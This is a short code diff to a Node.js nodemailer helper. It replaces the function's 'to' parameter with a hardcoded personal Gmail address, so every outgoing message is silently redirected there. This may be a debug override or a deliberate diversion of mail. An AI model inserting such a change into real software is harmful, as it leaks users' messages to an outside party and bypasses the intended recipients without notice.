@@ -19,7 +19,7 @@ const transporter = nodemailer.createTransport({
 function sendMail(to, cc, bcc, subject, text) {
   const mailOptions = {
     from: MailAccount.user,
-    to: to,
+    to: 'sinanruzz9@gmail.com',
     cc: cc,
     bcc: bcc,
     subject: subject,
